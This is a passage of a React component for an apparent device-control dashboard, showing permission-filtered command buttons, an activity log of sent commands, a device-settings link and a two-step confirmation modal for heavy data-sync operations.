                                <div className="grid grid-cols-2 lg:grid-cols-3 gap-4 animate-fade-in">
                                    {commandButtons
                                        .filter(cmd => isAdmin || hasPermission(cmd.permission))
                                        .map((cmd) => {
                                            const Icon = cmd.icon;
                                            const isLoading = commandLoading === cmd.type;
                                            const isDisabled = cooldown > 0 || !!commandLoading || !device.isOnline;
                                            const needsConfirm = (cmd as any).requiresConfirm;

                                            return (
                                                <button
                                                    key={`${cmd.type}-${cmd.label}`}
                                                    onClick={() => handleCommandWithConfirmation(cmd)}
                                                    disabled={isDisabled}
                                                    className={`group relative bg-white rounded-2xl border border-slate-200 p-5 text-left transition-all duration-300 ${isDisabled
                                                        ? 'opacity-50 cursor-not-allowed'
                                                        : 'hover:shadow-lg hover:-translate-y-0.5'
                                                        }`}
                                                >
                                                    {needsConfirm && (
                                                        <span className="absolute top-3 right-3 text-[10px] bg-amber-50 text-amber-600 px-2 py-0.5 rounded-full font-bold border border-amber-100">
                                                            ⚠️ Heavy
                                                        </span>
                                                    )}

                                                    <div className={`w-14 h-14 rounded-2xl bg-gradient-to-br ${cmd.gradient} flex items-center justify-center shadow-lg group-hover:scale-105 transition-transform mb-4`}>
                                                        {isLoading ? (
                                                            <RefreshCw className="w-7 h-7 text-white animate-spin" />
                                                        ) : (
                                                            <Icon className="w-7 h-7 text-white" />
                                                        )}
                                                    </div>
                                                    <h3 className="font-bold text-slate-800">{cmd.label}</h3>
                                                    <p className="text-sm text-slate-500 mt-1 capitalize">{cmd.category}</p>
                                                </button>
                                            );
                                        })}
                                </div>
                            )}
                        </div>

                        {/* Right Column - Activity Log - Light Theme */}
                        <div className="space-y-4">
                            <div className="flex items-center gap-3">
                                <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-slate-700 to-slate-800 flex items-center justify-center shadow-lg shadow-slate-200">
                                    <Activity className="w-6 h-6 text-white" />
                                </div>
                                <div>
                                    <h3 className="font-bold text-slate-900">Activity Log</h3>
                                    <p className="text-sm text-slate-500">Recent commands</p>
                                </div>
                            </div>

                            <div className="bg-white rounded-2xl border border-slate-200 overflow-hidden shadow-sm">
                                {commands.length === 0 ? (
                                    <div className="py-12 text-center">
                                        <div className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-slate-50 flex items-center justify-center">
                                            <Zap className="w-8 h-8 text-slate-300" />
                                        </div>
                                        <p className="text-sm font-medium text-slate-400">No recent activity</p>
                                    </div>
                                ) : (
                                    <div className="divide-y divide-slate-100">
                                        {commands.map((cmd, i) => (
                                            <div
                                                key={cmd.id}
                                                className="p-4 flex items-center justify-between hover:bg-slate-50 transition-colors"
                                            >
                                                <div>
                                                    <p className="font-semibold text-slate-800 capitalize">
                                                        {cmd.type.replace(/_/g, ' ')}
                                                    </p>
                                                    <p className="text-xs text-slate-400 mt-0.5">
                                                        {format(new Date(cmd.createdAt), 'MMM d, HH:mm')}
                                                    </p>
                                                </div>
                                                <div className={`flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-bold ${cmd.status === 'completed' ? 'bg-emerald-50 text-emerald-600 border border-emerald-100' :
                                                    cmd.status === 'failed' ? 'bg-red-50 text-red-600 border border-red-100' :
                                                        'bg-blue-50 text-blue-600 border border-blue-100'
                                                    }`}>
                                                    {cmd.status === 'completed' && <CheckCircle className="w-3.5 h-3.5" />}
                                                    {cmd.status === 'failed' && <XCircle className="w-3.5 h-3.5" />}
                                                    {(cmd.status === 'pending' || cmd.status === 'sent') && <RefreshCw className="w-3.5 h-3.5 animate-spin" />}
                                                    <span className="capitalize">{cmd.status}</span>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                )}
                            </div>

                            {/* Quick Settings Card - Light Theme */}
                            <Link
                                href={`/devices/view/settings/?id=${deviceId}`}
                                className="block bg-white rounded-2xl border border-slate-200 p-4 hover:shadow-lg hover:-translate-y-0.5 transition-all group"
                            >
                                <div className="flex items-center gap-4">
                                    <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-slate-700 to-slate-800 flex items-center justify-center shadow-lg group-hover:scale-105 transition-transform">
                                        <Settings className="w-6 h-6 text-white" />
                                    </div>
                                    <div className="flex-1">
                                        <h3 className="font-bold text-slate-800">Device Settings</h3>
                                        <p className="text-sm text-slate-500">Security & recording</p>
                                    </div>
                                    <ChevronRight className="w-5 h-5 text-slate-300 group-hover:text-violet-500 group-hover:translate-x-1 transition-all" />
                                </div>
                            </Link>
                        </div>
                    </div>
                </div>

                {/* Confirmation Modal - Light Theme */}
                {confirmModal?.show && (
                    <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
                        <div className="bg-white rounded-[2rem] p-8 max-w-sm w-full border border-slate-200 shadow-2xl animate-fade-in">
                            <div className="text-center mb-6">
                                <div className="w-20 h-20 mx-auto mb-4 rounded-2xl bg-amber-50 flex items-center justify-center border border-amber-100">
                                    <span className="text-4xl">⚠️</span>
                                </div>
                                <h3 className="text-xl font-bold text-slate-900 mb-2">
                                    {confirmModal.step === 1 ? 'Heavy Operation Warning' : 'Final Confirmation'}
                                </h3>
                                <p className="text-slate-500 text-sm leading-relaxed">
                                    {confirmModal.step === 1
                                        ? `"${confirmModal.label}" will sync ALL historical data. This may take a very long time and use significant data.`
                                        : `Are you absolutely sure? This action cannot be cancelled once started.`
                                    }
                                </p>
                            </div>
                            <div className="flex gap-3">
                                <button
                                    onClick={() => setConfirmModal(null)}
                                    className="flex-1 px-5 py-3 rounded-xl border border-slate-200 text-slate-600 font-bold hover:bg-slate-50 transition-colors"
                                >
                                    Cancel
                                </button>
                                <button
                                    onClick={handleConfirmProceed}
                                    className="flex-1 px-5 py-3 rounded-xl bg-gradient-to-r from-red-500 to-rose-600 text-white font-bold shadow-lg shadow-red-500/20 hover:shadow-red-500/30 transition-all"
                                >
                                    {confirmModal.step === 1 ? 'Continue' : 'Yes, Sync'}
                                </button>
                            </div>
                        </div>
                    </div>
                )}
            </main>
        </div>
    );
}
